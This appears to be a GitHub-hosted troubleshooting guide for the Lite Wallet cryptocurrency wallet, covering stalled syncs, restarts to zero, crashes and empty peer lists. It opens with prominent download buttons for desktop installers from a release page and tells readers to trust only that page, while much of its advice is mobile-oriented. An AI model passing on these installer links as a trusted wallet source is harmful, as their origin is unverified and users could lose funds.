![Lite Wallet](assets/banner-article.png)

# Sync stuck, stalling or starting over

The stalls, the loops, and the fix order that gets the chain moving again.

<p align="center"><a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe"><img src="assets/button-windows.png" alt="Download Lite Wallet for Windows"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-00D5FD?style=for-the-badge&labelColor=001116&logo=apple&logoColor=89EFFF" alt="Download Lite Wallet for macOS"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-00D5FD?style=for-the-badge&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Download Lite Wallet for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`litewallet-desktop-win-v3.15.2.exe`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-00D5FD?style=flat-square&labelColor=001116&logo=apple&logoColor=89EFFF" alt="macOS"> | macOS 12 or later | [`litewallet-desktop-macos-v3.15.2.dmg`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-00D5FD?style=flat-square&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`litewallet-desktop-linux-v3.15.2.zip`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip) |

</div>

All versions, installers and checksums are on the [release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).

> Only download from this GitHub release page.

Lite Wallet reads the chain from peers, and the progress indicator is the honest measure of how far it has got. A sync that stalls at 40 per cent, or falls back to zero, is a peer problem rather than a wallet problem - and it is fixable without reinstalling.

## What the sync is doing

The wallet does not download a balance; it downloads block headers and, for the addresses it owns, the transactions that touch them. That is why the first sync after a restore takes longer than a routine start: there is more history to walk. A send that never shows up afterwards is a different fault, covered in [the missing transaction guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/litewallet-transaction-stuck-or-missing.md).

| Phase | What happens | Normal duration |
|---|---|---|
| headers | block headers from peers | seconds to minutes |
| filters | matching blocks to your addresses | the slow part on old wallets |
| balance | values appear as matches are found | gradual, not instant |
| caught up | indicator settles, new blocks stream | continuous |

A fresh wallet has almost nothing to match and syncs quickly. A restored wallet with years of history can take hours, and the display will show low percentages for a long time.

## Sync stuck at a percentage

1. Leave the app open and foregrounded for several minutes; background restrictions pause progress.
2. Check the connection: Wi-Fi rather than metered mobile data, and no VPN in the way.
3. Open the node or peer list and confirm there are peers listed.
4. If peers are listed and progress is frozen, restart the app once.
5. If it freezes again at the same point, let it run longer before intervening.

The rule that saves the most time: do not restart repeatedly. Each restart can throw away partial progress, which is why people who restart six times never get past the same percentage.

## Why syncing goes 0 -> 20 -> 0

A drop back to a low percentage usually means the wallet discarded its peer connection and started again from a stored checkpoint, not that the work is lost. The two common triggers are an unstable connection and a peer that stopped serving mid-session.

| Pattern | Meaning | Fix |
|---|---|---|
| 0 -> 20 -> 0, repeating | connection dropping | stable network, then leave it alone |
| stalls at 40% and holds | a slow peer or filters phase | wait, or switch peers |
| creeps forward, then jumps | normal batching | none needed |
| never leaves 0% | no usable peer | check peers and network |

Repeated cycling on a stable connection points at the peer set rather than the app.

## Stalling at 40 per cent

Forty per cent is where the wallet stops downloading headers and starts matching filters, so it is the phase boundary rather than a fault. A wallet that appears frozen there is usually working: the indicator moves on block batches, and a batch on a slow peer takes time.

The practical test is CPU and network activity. If the device is warm and data is moving, leave it. If nothing is moving for ten minutes with peers listed, restart once and let the second attempt run without interruption.

## The app crashes when sync finishes

A crash at the end of a sync is a resource problem more often than a data problem: the wallet is loading a large history into memory at exactly the moment it becomes usable.

- Close other apps before the final phase.
- Free storage on the device; a full disk fails writes silently.
- Update to the current release, published on [the release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).
- If it recurs, restore on a machine with more memory.

Reinstalling does not fix this, and each reinstall restarts the scan - which is why the crash tends to look permanent to anyone who tries it.

## The node list is blank

A white or empty peer list means the wallet cannot reach any peer, which is a network or DNS condition rather than a wallet bug.

1. Confirm the device has working internet in another app.
2. Disable any VPN, proxy or private-relay feature temporarily.
3. Check whether a firewall is blocking the app's outbound connections.
4. Switch networks - mobile hotspot instead of home Wi-Fi - to isolate the cause.
5. Restart the app and re-check the list.

If the list populates on a different network, the problem is the network, not the wallet. Captive portals on hotel and cafe Wi-Fi produce exactly this symptom.

## Why a restore takes hours

Because the scan has to cover the gap between the wallet's last activity and now. A wallet created last week has a short gap; a wallet restored from a paper key written three years ago has three years of blocks to match against its addresses.

This is expected behaviour, not a fault, and it is the single most common reason a restored wallet looks empty. Making the paper key in the first place, and proving it restores, is the subject of [the paper key guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/litewallet-paper-key-backup-and-restore.md). Leave it running, preferably plugged in, and judge the result only after the indicator has settled. [The missing transaction guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/litewallet-transaction-stuck-or-missing.md) covers what to check once the sync has finished and something still looks wrong.

## Leaving it alone is the technique

Almost every sync problem reported as unfixable turns out to be a wallet that was interrupted. People restart the app when progress pauses, reinstall when a restart does not help, and restore when a reinstall does not help, and each of those actions takes the scan back to the beginning.

The technique that works is dull: start one scan, plug the device in, put it on a network you trust, keep the app in the foreground, and leave it for as long as it takes. On a wallet with a long history that can be hours, and the percentage will look wrong for most of it.

Judging progress by the indicator alone is misleading, because it moves in batches. A better signal is whether the device is working: warm, using data, and showing a peer connection. If those are true, the wallet is doing what it was asked to do, and interrupting it is the only way to make things worse.

Intervene only when the evidence says to: no peers listed, no data moving for a sustained period, or a crash that repeats at the same point.

## FAQ

### Why does my sync keep going back to zero?

The wallet is dropping a peer connection and restarting from a checkpoint. Use a stable network, disable VPN or relay features, and let one attempt run without restarting it.

### Why does syncing stall at 40 percent?

That is where header download gives way to filter matching. It is a phase boundary, not a fault; a slow peer makes it look frozen. Check that peers are listed and data is moving.

### Lite Wallet is not syncing at all - what now?

If the peer list is empty, the device cannot reach any peer. Confirm internet access, remove VPN or proxy layers, check firewall rules, and try a different network.

### Why is a full sync taking hours after I restored my wallet?

Because the scan covers the whole period since the wallet was last used. A restored wallet with years of history is expected to take hours; start it plugged in and leave it running.

### The app crashes when sync finishes - is my wallet lost?

No. It is usually memory or storage pressure at the moment the history loads. Close other apps, free disk space, update the release, and restore on a machine with more memory if it recurs.

Sync behaviour described here matches the current release, published on [the release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).
